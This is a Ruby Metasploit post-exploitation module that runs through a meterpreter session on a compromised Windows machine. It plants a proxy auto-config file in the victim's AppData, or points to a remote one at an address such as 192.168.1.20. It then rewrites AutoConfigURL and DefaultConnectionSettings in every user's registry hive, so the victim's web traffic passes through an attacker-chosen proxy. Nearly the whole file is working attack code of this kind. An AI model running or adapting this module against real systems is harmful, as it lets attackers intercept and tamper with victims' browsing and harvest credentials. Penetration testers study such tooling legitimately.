##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class Metasploit3 < Msf::Post

	include Msf::Post::Windows::Priv
	include Msf::Post::Common
	include Msf::Post::File
	include Msf::Post::Windows::Registry

	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Windows Manage Proxy PAC File',
			'Description'   => %q{
							This module configures Internet Explorer to use a PAC proxy file. By using the LOCAL_PAC
						option a PAC file will be created in the victim host. It's also possible to especify a
						remote PAC file (REMOTE_PAC option) by providing the full URL. Ej: http://192.168.1.20/proxy.pac
						},
			'License'       => MSF_LICENSE,
			'Author'        => [ 'Borja Merino <bmerinofe[at]gmail.com>'],
			'References'    =>
						[
							[ 'URL', 'https://www.youtube.com/watch?v=YGjIlbBVDqE&hd=1' ],
							[ 'URL', 'http://blog.scriptmonkey.eu/bypassing-group-policy-using-the-windows-registry' ]
						],
			'Platform'      => [ 'windows' ],
			'SessionTypes'  => [ 'meterpreter' ]
		))

		register_options(
			[
				OptPath.new('LOCAL_PAC',	[false,	'Local PAC file.' ]),
				OptString.new('REMOTE_PAC',	[false,	'Remote PAC file.' ]),
				OptBool.new('DISABLE_PROXY',[false, 'Disable the proxy server.', false]),
				OptBool.new('AUTO_DETECT',	[false, 'Automatically detect settings.', false])
			], self.class)
	end

	def run
		if datastore['LOCAL_PAC'].nil? and datastore['REMOTE_PAC'].nil?
			print_error("You must set a remote or local PAC file.")
			return
		end

		unless datastore['LOCAL_PAC']
			@remote = true
			print_status("Setting a remote PAC file ...")
			enable_proxypac(datastore['REMOTE_PAC'])
		else
			print_status("Setting a local PAC file ...")
			pac_file = create_pac(datastore['LOCAL_PAC'])
			enable_proxypac(pac_file) if pac_file
		end

		auto_detect_on if datastore['AUTO_DETECT']
		disable_proxy if datastore['DISABLE_PROXY']
	end

	def create_pac(local_pac)
		pac_file = expand_path("%APPDATA%") << "\\" << Rex::Text.rand_text_alpha((rand(8)+6)) << ".pac"
		conf_pac = ""

		if ::File.exists?(local_pac)
			conf_pac << ::File.open(local_pac, "rb").read
		else
			print_error("Local PAC file not found.")
			return false
		end

		if write_file(pac_file,conf_pac)
			print_good ("PAC proxy configuration file written to #{pac_file}")
			return pac_file
		else
			print_error("There were problems creating the PAC proxy file.")
			return false
		end
	end

	def enable_proxypac(pac)
		registry_enumkeys('HKU').each do |k|
			next unless k.include? "S-1-5-21"
			next if k.include? "_Classes"
			key = "HKEY_USERS\\#{k}\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet\ Settings"
			value_auto = "AutoConfigURL"
			file = (@remote) ? "#{pac}" : "file://#{pac}"
			begin
				registry_setvaldata(key,value_auto,file,"REG_SZ")
			rescue::Exception => e
			end
			print_good ("Proxy PAC enabled.") if change_defConSettings(16,'05',key + '\\Connections')
		end
	end

	def auto_detect_on()
		registry_enumkeys('HKU').each do |k|
			next unless k.include? "S-1-5-21"
			next if k.include? "_Classes"
			key = "HKEY_USERS\\#{k}\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet\ Settings\\Connections"
			print_good ("Automatically detect settings on.") if change_defConSettings(16,'0D',key)
		end
	end

	def disable_proxy()
		value_enable = "ProxyEnable"
		profile = false
		registry_enumkeys('HKU').each do |k|
			next unless k.include? "S-1-5-21"
			next if k.include? "_Classes"
			key = "HKEY_USERS\\#{k}\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet\ Settings"
			begin
				registry_setvaldata(key,value_enable,0,"REG_DWORD")
				profile = true
			rescue::Exception => e
			end
		end
		print_good ("Proxy disable.") if profile
	end

	def change_defConSettings(offset,value,key)
		value_defCon = "DefaultConnectionSettings"
		begin
			value_con = registry_getvaldata(key,value_defCon)
			binary_data = value_con.unpack('H*')[0]
			binary_data[offset,2] = value
			registry_setvaldata(key,value_defCon,["%x" % binary_data.to_i(16)].pack("H*"),"REG_BINARY")
		rescue::Exception => e
			return false
		end
	end
end
